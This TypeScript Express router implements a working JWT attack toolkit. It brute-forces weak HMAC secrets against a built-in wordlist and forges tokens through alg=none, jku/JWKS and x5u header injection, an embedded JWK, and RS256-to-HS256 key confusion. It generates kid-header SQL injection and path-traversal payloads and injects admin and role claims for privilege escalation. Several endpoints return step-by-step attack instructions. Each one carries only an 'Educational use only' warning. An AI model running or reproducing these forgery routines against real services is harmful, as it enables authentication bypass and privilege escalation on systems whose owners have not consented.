// Copyright © 2026 Alpha Unlimited Technologies LLC. All rights reserved.
import { Router } from "express";
import * as crypto from "crypto";
import { z } from "zod";

const TokenBody       = z.object({ token: z.string().min(1, "token required") });
const CrackBody       = TokenBody.extend({ customSecrets: z.array(z.string()).optional() });
const JwksInjectBody  = TokenBody.extend({ jwksUrl: z.string().url("jwksUrl must be a valid URL") });
const ClaimEscBody    = TokenBody.extend({ targetClaims: z.record(z.unknown()).optional() });
const X5uInjectBody   = TokenBody.extend({ x5uUrl: z.string().url("x5uUrl must be a valid URL") });
const KeyConfBody     = TokenBody.extend({ publicKey: z.string().min(1, "publicKey required") });
const SignBody        = z.object({
  payload: z.record(z.unknown()),
  secret:  z.string().min(1, "secret required"),
  alg:     z.enum(["HS256", "HS384", "HS512"]).optional(),
});

const router = Router();

function base64UrlDecode(str: string): string {
  const padded = str.replace(/-/g, "+").replace(/_/g, "/").padEnd(str.length + ((4 - (str.length % 4)) % 4), "=");
  try { return Buffer.from(padded, "base64").toString("utf8"); }
  catch { return ""; }
}

function decodeJwt(token: string) {
  const parts = token.trim().split(".");
  if (parts.length < 2) throw new Error("Not a valid JWT (need at least 2 parts)");
  const header  = JSON.parse(base64UrlDecode(parts[0]));
  const payload = JSON.parse(base64UrlDecode(parts[1]));
  return { header, payload, signature: parts[2] || "", parts };
}

// Weak secrets wordlist for HS* brute-force
const COMMON_SECRETS = [
  // Most common
  "secret", "password", "123456", "changeme", "jwt_secret",
  "supersecret", "mysecret", "test", "key", "abc123",
  "qwerty", "admin", "letmein", "welcome", "pass123",
  "secret123", "jwtkey", "signing_key", "app_secret", "token_secret",
  "your-256-bit-secret", "your-512-bit-secret", "my_secret_key",
  "HS256", "HS512", "development", "dev_secret", "prod_secret",
  // Common dev/demo values
  "1234567890", "password1", "Password1", "P@ssw0rd", "passw0rd",
  "admin123", "admin1234", "root", "toor", "qwerty123", "letmein1",
  "iloveyou", "monkey", "dragon", "master", "sunshine", "princess",
  "football", "baseball", "batman", "superman", "trustno1",
  // Framework defaults
  "keyboard cat", "keyboard_cat", "shhhhh", "ultra secret",
  "unsafe", "weak_secret", "change_this", "replace_me", "fixme",
  "placeholder", "example", "sample", "demo", "testing",
  "development_secret", "staging_secret", "production_secret",
  // Common env var names used as values
  "JWT_SECRET", "JWT_KEY", "TOKEN_SECRET", "APP_SECRET", "API_KEY",
  "SECRET_KEY", "AUTH_SECRET", "SESSION_SECRET", "ENCRYPTION_KEY",
  // Short numeric
  "123", "1234", "12345", "123456789", "0000", "1111", "9999",
  // Framework/library defaults
  "express-session-secret", "cookie-secret", "rails-secret",
  "laravel-secret", "django-secret-key", "flask-secret",
  "nextjs-secret", "nuxt-secret", "gatsby-secret",
  // Company/product names (common in CTFs/bug bounties)
  "company", "myapp", "webapp", "website", "application",
  "api", "service", "backend", "frontend", "server",
  // Random looking but common
  "abcdef", "abcdefgh", "abcdefghij", "abcdefghijklmno",
  "aaaaaa", "aaaaaaaaaa", "xxxxxxxx", "zzzzzzzz",
  "s3cr3t", "p4ssw0rd", "secr3t", "passw0rd",
];

function hmacSign(data: string, secret: string, alg: string): string {
  const hashAlg = alg === "HS256" ? "sha256" : alg === "HS384" ? "sha384" : "sha512";
  return crypto.createHmac(hashAlg, secret).update(data).digest("base64url");
}

// Decode
router.post("/decode", (req, res) => {
  const parsed = TokenBody.safeParse(req.body);
  if (!parsed.success) return res.status(400).json({ error: parsed.error.errors[0]?.message ?? "token required" });
  const { token } = parsed.data;
  try {
    const { header, payload, signature, parts } = decodeJwt(token);
    const now = Math.floor(Date.now() / 1000);
    const issues: { severity: string; title: string; detail: string }[] = [];

    // Check alg
    if (!header.alg || header.alg === "none") {
      issues.push({ severity: "CRITICAL", title: "Algorithm: none", detail: "Token uses no signature — trivially forgeable." });
    }
    if (["HS256", "HS384", "HS512"].includes(header.alg)) {
      issues.push({ severity: "MEDIUM", title: "Symmetric HMAC algorithm", detail: "If secret is weak, token can be cracked offline." });
    }

    // Expiry
    if (!payload.exp) {
      issues.push({ severity: "HIGH", title: "No expiration (exp)", detail: "Token never expires — valid indefinitely." });
    } else if (payload.exp < now) {
      issues.push({ severity: "MEDIUM", title: "Token expired", detail: `Expired ${new Date(payload.exp * 1000).toISOString()}` });
    }

    // No issued-at
    if (!payload.iat) {
      issues.push({ severity: "LOW", title: "No issued-at (iat)", detail: "Cannot determine token age." });
    }

    // No audience
    if (!payload.aud) {
      issues.push({ severity: "LOW", title: "No audience (aud)", detail: "Audience not restricted — may be accepted by unintended services." });
    }

    res.json({
      header, payload, signature,
      raw: { header: parts[0], payload: parts[1], signature: parts[2] },
      issues,
      isExpired: payload.exp ? payload.exp < now : false,
      expiresAt: payload.exp ? new Date(payload.exp * 1000).toISOString() : null,
      issuedAt: payload.iat ? new Date(payload.iat * 1000).toISOString() : null,
    });
  } catch (e: any) {
    res.status(400).json({ error: e.message });
  }
});

// alg=none attack
router.post("/alg-none", (req, res) => {
  const parsed = TokenBody.safeParse(req.body);
  if (!parsed.success) return res.status(400).json({ error: parsed.error.errors[0]?.message ?? "token required" });
  const { token } = parsed.data;
  try {
    const { header, payload } = decodeJwt(token);
    header.alg = "none";
    const newHeader  = Buffer.from(JSON.stringify(header)).toString("base64url");
    const newPayload = Buffer.from(JSON.stringify(payload)).toString("base64url");
    const forged = `${newHeader}.${newPayload}.`;
    res.json({
      forgedToken: forged,
      description: "Signature stripped and alg set to 'none'. If the server accepts this, it does not validate signatures.",
      warning: "Educational use only — test only on systems you own or have explicit permission to test.",
    });
  } catch (e: any) {
    res.status(400).json({ error: e.message });
  }
});

// HMAC secret brute-force
router.post("/crack", (req, res) => {
  const parsed = CrackBody.safeParse(req.body);
  if (!parsed.success) return res.status(400).json({ error: parsed.error.errors[0]?.message ?? "token required" });
  const { token, customSecrets } = parsed.data;
  try {
    const { header, parts } = decodeJwt(token);
    if (!["HS256", "HS384", "HS512"].includes(header.alg)) {
      return res.json({ cracked: false, secret: null, message: `Algorithm ${header.alg} is not HMAC — cannot brute-force with this method.` });
    }
    const data = `${parts[0]}.${parts[1]}`;
    const wordlist = [...COMMON_SECRETS, ...(customSecrets || [])];

    for (const secret of wordlist) {
      const sig = hmacSign(data, secret, header.alg);
      if (sig === parts[2]) {
        return res.json({ cracked: true, secret, algorithm: header.alg, message: `Secret found: "${secret}" — this token uses a weak, guessable secret.` });
      }
    }
    res.json({ cracked: false, secret: null, message: `Not found in ${wordlist.length}-word wordlist. Secret may be strong or require a larger dictionary.` });
  } catch (e: any) {
    res.status(400).json({ error: e.message });
  }
});

// ── JWKS injection — forge a token with jku/x5u pointing to an attacker-controlled JWKS ──
router.post("/jwks-inject", (req, res) => {
  const parsed = JwksInjectBody.safeParse(req.body);
  if (!parsed.success) return res.status(400).json({ error: parsed.error.errors[0]?.message ?? "token and jwksUrl required" });
  const { token, jwksUrl } = parsed.data;
  try {
    const { header, payload, parts } = decodeJwt(token);
    const forgedHeader = { ...header, jku: jwksUrl };
    delete forgedHeader.x5u;
    const h = Buffer.from(JSON.stringify(forgedHeader)).toString("base64url");
    const p = parts[1];
    const forgedToken = `${h}.${p}.REPLACE_WITH_VALID_SIG`;
    const exampleJwks = {
      keys: [{
        kty: "RSA",
        kid: header.kid || "attacker-key",
        use: "sig",
        alg: "RS256",
        n: "REPLACE_WITH_YOUR_RSA_MODULUS",
        e: "AQAB",
      }]
    };
    res.json({
      forgedToken,
      description: "The jku header now points to your JWKS endpoint. If the server fetches the JWKS from this URL to verify the token, you control which key is used for verification.",
      step1: "Host a JWKS JSON at the jwksUrl containing your RSA public key",
      step2: "Sign the token with your RSA private key",
      step3: "Submit the forged token — the server will fetch your key and accept it",
      exampleJwks,
      warning: "Educational use only — test only on systems you own or have permission to test.",
    });
  } catch (e: any) {
    res.status(400).json({ error: e.message });
  }
});

// ── Embedded JWK attack — put attacker's public key directly in the header ──
router.post("/embedded-jwk", (req, res) => {
  const parsed = TokenBody.safeParse(req.body);
  if (!parsed.success) return res.status(400).json({ error: parsed.error.errors[0]?.message ?? "token required" });
  const { token } = parsed.data;
  try {
    const { header, parts } = decodeJwt(token);
    const { privateKey, publicKey } = crypto.generateKeyPairSync("rsa", { modulusLength: 2048 });
    const pubDer = publicKey.export({ type: "pkcs1", format: "der" }) as Buffer;
    const privPem = privateKey.export({ type: "pkcs8", format: "pem" }) as string;
    const jwk = {
      kty: "RSA",
      n: pubDer.slice(9, 9 + 256).toString("base64url"),
      e: "AQAB",
      alg: "RS256",
      use: "sig",
    };
    const forgedHeader = { ...header, alg: "RS256", jwk };
    delete forgedHeader.jku;
    delete forgedHeader.x5u;
    const h = Buffer.from(JSON.stringify(forgedHeader)).toString("base64url");
    const p = parts[1];
    const sig = crypto.sign("sha256", Buffer.from(`${h}.${p}`), privateKey);
    const forgedToken = `${h}.${p}.${sig.toString("base64url")}`;
    res.json({
      forgedToken,
      privateKeyPem: privPem,
      description: "An RSA keypair was generated server-side. The attacker's public key is embedded in the jwk header field. If the server trusts the embedded JWK instead of a pre-configured key, it will accept this forged token.",
      warning: "Educational use only.",
    });
  } catch (e: any) {
    res.status(400).json({ error: e.message });
  }
});

// ── kid SQL injection ──
router.post("/kid-injection", (req, res) => {
  const parsed = TokenBody.safeParse(req.body);
  if (!parsed.success) return res.status(400).json({ error: parsed.error.errors[0]?.message ?? "token required" });
  const { token } = parsed.data;
  try {
    const { header, payload } = decodeJwt(token);
    const payloads = [
      { label: "SQL UNION — force empty key", kid: "' UNION SELECT '\\x00'--" },
      { label: "SQL OR 1=1 — bypass key lookup", kid: "' OR 1=1--" },
      { label: "Path traversal — use /dev/null as key", kid: "../../dev/null" },
      { label: "Path traversal — force empty file", kid: "../../../../../../../dev/null" },
      { label: "NULL byte injection", kid: "key\x00injected" },
      { label: "SQLite — force null key", kid: "' UNION SELECT NULL--" },
    ];
    const results = payloads.map((p) => {
      const injectedHeader = { ...header, kid: p.kid };
      const h = Buffer.from(JSON.stringify(injectedHeader)).toString("base64url");
      const pl = Buffer.from(JSON.stringify(payload)).toString("base64url");
      const data = `${h}.${pl}`;
      const sig = crypto.createHmac("sha256", "").update(data).digest("base64url");
      return {
        label: p.label,
        kid: p.kid,
        forgedToken: `${data}.${sig}`,
        signingSecret: "(empty string — works if kid resolves to null/empty key)",
      };
    });
    res.json({
      results,
      description: "The kid (key ID) header value is injected into SQL or filesystem lookups. If not sanitized, this can redirect key resolution to attacker-controlled values or force an empty/null signing key.",
      warning: "Educational use only.",
    });
  } catch (e: any) {
    res.status(400).json({ error: e.message });
  }
});

// ── Claim escalation — modify role/admin claims ──
router.post("/claim-escalate", (req, res) => {
  const parsed = ClaimEscBody.safeParse(req.body);
  if (!parsed.success) return res.status(400).json({ error: parsed.error.errors[0]?.message ?? "token required" });
  const { token, targetClaims } = parsed.data;
  try {
    const { header, payload, parts } = decodeJwt(token);
    const defaultEscalations: Record<string, any> = {
      role: "admin",
      is_admin: true,
      admin: true,
      scope: "admin:all read:all write:all delete:all",
      groups: ["admin", "superuser", "staff"],
      type: "admin",
      level: 0,
      plan: "enterprise",
      permissions: ["*"],
    };
    const escalated = { ...payload, ...defaultEscalations, ...(targetClaims || {}) };
    const h = parts[0];
    const p = Buffer.from(JSON.stringify(escalated)).toString("base64url");
    const algIsNone = header.alg === "none" || !header.alg;
    let forgedToken: string;
    if (algIsNone) {
      forgedToken = `${h}.${p}.`;
    } else {
      forgedToken = `${h}.${p}.INVALID_SIG_REPLACE_OR_USE_KNOWN_SECRET`;
    }
    res.json({
      originalClaims: payload,
      escalatedClaims: escalated,
      forgedToken,
      description: "Common privilege-escalation claims have been injected. If the server reads role/admin from JWT without re-validating against DB, the escalation may succeed.",
      needsSignature: !algIsNone,
      warning: "Educational use only.",
    });
  } catch (e: any) {
    res.status(400).json({ error: e.message });
  }
});

// ── X5U header injection — point x5u to attacker certificate ──
router.post("/x5u-inject", (req, res) => {
  const parsed = X5uInjectBody.safeParse(req.body);
  if (!parsed.success) return res.status(400).json({ error: parsed.error.errors[0]?.message ?? "token and x5uUrl required" });
  const { token, x5uUrl } = parsed.data;
  try {
    const { header, parts } = decodeJwt(token);
    const forgedHeader = { ...header, x5u: x5uUrl };
    delete forgedHeader.jku;
    const h = Buffer.from(JSON.stringify(forgedHeader)).toString("base64url");
    const forgedToken = `${h}.${parts[1]}.REPLACE_WITH_VALID_SIG`;
    res.json({
      forgedToken,
      description: "The x5u header points to an attacker-controlled X.509 certificate URL. If the server fetches and trusts this certificate for signature verification, the forged token will be accepted.",
      step1: "Host a self-signed X.509 certificate (PEM) at the x5uUrl",
      step2: "Sign the token with the private key matching that certificate",
      step3: "Submit — the server verifies against your certificate",
      warning: "Educational use only.",
    });
  } catch (e: any) {
    res.status(400).json({ error: e.message });
  }
});

// RS256→HS256 key confusion attack (educational — just shows the forged structure)
router.post("/key-confusion", (req, res) => {
  const parsed = KeyConfBody.safeParse(req.body);
  if (!parsed.success) return res.status(400).json({ error: parsed.error.errors[0]?.message ?? "token and publicKey required" });
  const { token, publicKey } = parsed.data;
  try {
    const { header, payload } = decodeJwt(token);
    const newHeader = { ...header, alg: "HS256" };
    const h = Buffer.from(JSON.stringify(newHeader)).toString("base64url");
    const p = Buffer.from(JSON.stringify(payload)).toString("base64url");
    const data = `${h}.${p}`;
    const sig = crypto.createHmac("sha256", publicKey).update(data).digest("base64url");
    const forgedToken = `${data}.${sig}`;
    res.json({
      forgedToken,
      originalAlg: header.alg,
      newAlg: "HS256",
      description: "Key confusion: HS256 signature computed using the RS256 public key as HMAC secret. If the server accepts RS256 or HS256 for the same key, this may bypass verification.",
      warning: "Educational use only.",
    });
  } catch (e: any) {
    res.status(400).json({ error: e.message });
  }
});

// Sign a new token
router.post("/sign", (req, res) => {
  const parsed = SignBody.safeParse(req.body);
  if (!parsed.success) return res.status(400).json({ error: parsed.error.errors[0]?.message ?? "payload and secret required" });
  const { payload, secret, alg } = parsed.data;
  const algorithm = alg || "HS256";
  try {
    const header  = Buffer.from(JSON.stringify({ alg: algorithm, typ: "JWT" })).toString("base64url");
    const pl = Buffer.from(JSON.stringify(payload)).toString("base64url");
    const data = `${header}.${pl}`;
    const sig  = hmacSign(data, secret, algorithm);
    res.json({ token: `${data}.${sig}`, algorithm });
  } catch (e: any) {
    res.status(400).json({ error: e.message });
  }
});

export default router;
